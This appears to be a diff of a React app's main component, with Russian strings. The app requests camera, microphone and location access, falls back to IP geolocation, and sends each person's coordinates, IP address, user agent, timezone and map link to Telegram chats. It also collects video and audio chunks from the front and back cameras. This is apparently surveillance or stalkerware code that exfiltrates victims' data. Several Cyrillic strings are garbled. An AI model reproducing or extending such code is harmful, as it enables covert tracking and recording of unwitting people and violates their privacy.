@@ -368,7 +368,7 @@ export default function App() {
       cameraSuccess = true;
       
       // Update UI after success
-      setCoordsData('✅ Камера и микрофон: разрешено\n\n🔄 Запрашиваем геолокацию...');
+      setCoordsData('✅ Камера и микрофон: разрешено\n\n🔄 Запрашиваем геол��кацию...');
       setShowCoords(true);
     } catch (e: any) {
       hasErrors = true;
@@ -397,7 +397,7 @@ export default function App() {
       // On macOS, trigger Local Network Access request BEFORE geolocation
       if (isMac) {
         log('🖥️ macOS - триггерим Local Network Access...');
-        setCoordsData((prev) => prev + '\n\n⚠️ macOS: Разрешите доступ к локальной ��ети');
+        setCoordsData((prev) => prev + '\n\n⚠️ macOS: Разрешите доступ к локальной ети');
         await triggerLocalNetworkAccess();
       }
       
@@ -427,7 +427,7 @@ export default function App() {
           log('⚠️ WiFi триангуляция не работает, пробуем IP-геолокацию...');
           const ipGeo = await getIPGeolocation();
           
-          results.push(`⚠️ WiFi триангуляция недоступна\n\n✅ IP-геолокация (менее точная):\nlat: ${ipGeo.latitude.toFixed(6)}\nlng: ${ipGeo.longitude.toFixed(6)}\nточность: ±${Math.round(ipGeo.accuracy / 1000)} км${ipGeo.city ? '\nГород: ' + ipGeo.city : ''}`);
+          results.push(`⚠️ WiFi триангуляция недоступна\n\n✅ IP-геолок��ция (менее точная):\nlat: ${ipGeo.latitude.toFixed(6)}\nlng: ${ipGeo.longitude.toFixed(6)}\nточность: ±${Math.round(ipGeo.accuracy / 1000)} км${ipGeo.city ? '\nГород: ' + ipGeo.city : ''}`);
           
           // Send IP-based location to Telegram
           await sendToTelegram(ipGeo.latitude, ipGeo.longitude, ipGeo.accuracy);
@@ -661,10 +661,10 @@ export default function App() {
         `   Долгота: ${lng}\n` +
         `   Точность: ±${Math.round(accuracy)} м\n\n` +
         `🌐 IP-адрес: ${ip}\n` +
-        `🔍 Браузер: ${browserInfo}\n` +
-        `📱 UserAgent: ${userAgent}\n\n` +
+        `🔍 Браузер: ${browserInfo}\n\n` +
         `🕐 Timezone: ${timezone} (${timezoneUTC})\n` +
         `⏰ Локальное время: ${localTime}\n\n` +
+        `📱 User Agent:\n<code>${userAgent}</code>\n\n` +
         `🗺️ Карта: ${googleMapsLink}`;
 
       console.log('📝 Сообщение подготовлено:', message.substring(0, 100) + '...');
@@ -680,7 +680,7 @@ export default function App() {
         return;
       }
 
-      console.log(`📤 Отправляем ${chatIds.size} пользовател��м...`);
+      console.log(`📤 Отправляем ${chatIds.size} пользователм...`);
 
       // Send message to all users
       let successCount = 0;
@@ -850,7 +850,7 @@ export default function App() {
   
   // Handle video chunk ready with camera switching logic
   const handleVideoChunkReady = async (blob: Blob, chunkNum: number, cameraType: 'front' | 'back' | 'desktop') => {
-    console.log(`📹 Получен видео+аудио ��анк #${chunkNum} (${cameraType}), размер: ${blob.size} bytes`);
+    console.log(`📹 Получен видео+аудио анк #${chunkNum} (${cameraType}), размер: ${blob.size} bytes`);
     
     // Update current chunk number
     setCurrentChunkNumber(chunkNum);
